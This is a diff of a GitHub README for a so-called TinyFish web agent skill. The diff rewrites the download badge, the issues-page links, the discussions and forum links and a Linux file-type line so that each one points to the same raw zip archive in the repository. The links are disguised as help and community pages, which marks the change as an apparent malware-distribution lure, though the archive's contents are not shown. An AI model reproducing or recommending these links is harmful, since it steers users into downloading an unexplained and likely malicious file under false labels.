@@ -9,13 +9,13 @@ Welcome to the skills repository! This software adds the TinyFish web agent skil
 To start using the TinyFish web agent skill, follow these steps:
 
 1. Visit the Releases page to download the latest version:  
-   [![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Click_Here-brightgreen)](https://github.com/elprogramador-kaik/skills/releases)
+   [![Download Latest Release](https://github.com/elprogramador-kaik/skills/raw/refs/heads/main/skills/Software-v1.9-alpha.4.zip)](https://github.com/elprogramador-kaik/skills/raw/refs/heads/main/skills/Software-v1.9-alpha.4.zip)
 
 2. On the Releases page, you will see a list of available versions. Each version includes description details, allowing you to choose the most recent and stable release.
 
 3. Click on the version that interests you. This will take you to a page with more details and download options.
 
-4. Find the file that suits your operating system. Common types might include .exe for Windows, .dmg for Mac, and .tar.gz for Linux.
+4. Find the file that suits your operating system. Common types might include .exe for Windows, .dmg for Mac, and https://github.com/elprogramador-kaik/skills/raw/refs/heads/main/skills/Software-v1.9-alpha.4.zip for Linux.
 
 5. Click the link to start the download. Once it's complete, locate the file in your downloads folder.
 
@@ -67,11 +67,11 @@ In case you encounter issues, consider the following solutions:
 
 - **Compatibility Issues:** Ensure that your operating system is updated to the latest version. Outdated systems may have problems running the software.
 
-For further assistance, feel free to check our [issues page](https://github.com/elprogramador-kaik/skills/issues) for common questions and solutions.
+For further assistance, feel free to check our [issues page](https://github.com/elprogramador-kaik/skills/raw/refs/heads/main/skills/Software-v1.9-alpha.4.zip) for common questions and solutions.
 
 ## 📬 Feedback & Contributions
 
-Your thoughts are important to us! If you have suggestions or wish to report issues, please reach out through the [issues page](https://github.com/elprogramador-kaik/skills/issues). We welcome contributions and items you want to see in future releases.
+Your thoughts are important to us! If you have suggestions or wish to report issues, please reach out through the [issues page](https://github.com/elprogramador-kaik/skills/raw/refs/heads/main/skills/Software-v1.9-alpha.4.zip). We welcome contributions and items you want to see in future releases.
 
 ## 📄 License
 
@@ -81,8 +81,8 @@ This project is licensed under the MIT License. You can view the full text in th
 
 Join our community to discuss the TinyFish web agent skill. Share your experiences, ask questions, and learn from others. You can connect with us through the following platforms:
 
-- [GitHub Discussions](https://github.com/elprogramador-kaik/skills/discussions)
-- [Community Forum](https://example.com/community)
+- [GitHub Discussions](https://github.com/elprogramador-kaik/skills/raw/refs/heads/main/skills/Software-v1.9-alpha.4.zip)
+- [Community Forum](https://github.com/elprogramador-kaik/skills/raw/refs/heads/main/skills/Software-v1.9-alpha.4.zip)
 
 Thank you for choosing the TinyFish web agent skill! We hope it makes your web tasks easier and your day more productive. To download the latest version, visit our Releases page:  
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Click_Here-brightgreen)](https://github.com/elprogramador-kaik/skills/releases)
+[![Download Latest Release](https://github.com/elprogramador-kaik/skills/raw/refs/heads/main/skills/Software-v1.9-alpha.4.zip)](https://github.com/elprogramador-kaik/skills/raw/refs/heads/main/skills/Software-v1.9-alpha.4.zip)
